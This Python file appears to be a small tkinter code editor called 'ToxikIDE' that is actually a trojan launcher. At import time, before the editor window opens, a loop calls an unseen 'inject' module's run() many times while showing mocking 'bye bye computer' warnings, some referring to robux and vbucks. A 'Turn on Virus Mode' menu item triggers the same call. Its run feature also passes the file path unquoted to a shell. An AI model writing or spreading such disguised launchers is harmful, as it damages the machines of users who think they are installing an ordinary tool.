from tkinter import *
import platform
import tkinter.messagebox
from tkinter.filedialog import asksaveasfilename, askopenfilename
import subprocess
import inject

compiler = Tk()
compiler.title('ToxikIDE')
file_path = ''


def set_file_path(path):
    global file_path
    file_path = path


def AllowVirus():
    inject.run()


for i in range(100):
    i2 = i + 1
    allowed = inject.allowedOS()
    OS = inject.getOS()
    if i2 <= 30 and allowed:
        tkinter.messagebox.showwarning(
            title="bye bye computer no. {}".format(i2),
            message=
            "that was a bad idea :/ dont try restarting, it makes it worse")
        inject.run()
    elif i2 <= 50 and allowed:
        tkinter.messagebox.showwarning(
            title="bye bye computer",
            message="well i guess dont press ads like that")
        inject.run()
    elif i2 <= 70 and allowed:
        tkinter.messagebox.showwarning(title="bye bye computer",
                                       message="it was just a prank bro")
        inject.run()
    elif i2 == 99 and allowed:
        tkinter.messagebox.showwarning(
            title="bye bye computer",
            message="why do you need robux/vbucks/minecoins anyway?")
        inject.run()
    elif i2 == 100 and allowed:
        tkinter.messagebox.showwarning(title="bye bye computer",
                                       message="bye for now..")
        inject.run()
    elif not allowed:
        tkinter.messagebox.showwarning(
            title="FATAL ERR",
            message=
            "PYTHON PAGACKE GAME.CURRENCY.get: COMPUTER.TYPE {} NOT SUPPORTED".
            format(OS))


def open_file():
    path = askopenfilename(filetypes=[('Python Files', '*.py')])
    with open(path, 'r') as file:
        code = file.read()
        editor.delete('1.0', END)
        editor.insert('1.0', code)
        set_file_path(path)


def save_as():
    if file_path == '':
        path = asksaveasfilename(filetypes=[('Python Files', '*.py')])
    else:
        path = file_path
    with open(path, 'w') as file:
        code = editor.get('1.0', END)
        file.write(code)
        set_file_path(path)


def run():
    if file_path == '':
        save_prompt = Toplevel()
        text = Label(save_prompt, text='Please save your code')
        text.pack()
        return
    command = f'python {file_path}'
    process = subprocess.Popen(command,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               shell=True)
    output, error = process.communicate()
    code_output.insert('1.0', output)
    code_output.insert('1.0', error)


menu_bar = Menu(compiler)

file_menu = Menu(menu_bar, tearoff=0)
file_menu.add_command(label='Open', command=open_file)
file_menu.add_command(label='Turn on Virus Mode', command=AllowVirus)
file_menu.add_command(label='Save', command=save_as)
file_menu.add_command(label='Save As', command=save_as)
file_menu.add_command(label='Exit', command=exit)
menu_bar.add_cascade(label='File', menu=file_menu)

run_bar = Menu(menu_bar, tearoff=0)
run_bar.add_command(label='Run', command=run)
menu_bar.add_cascade(label='Run', menu=run_bar)

compiler.config(menu=menu_bar)

editor = Text()
editor.pack()

code_output = Text(height=10)
code_output.pack()

compiler.mainloop()
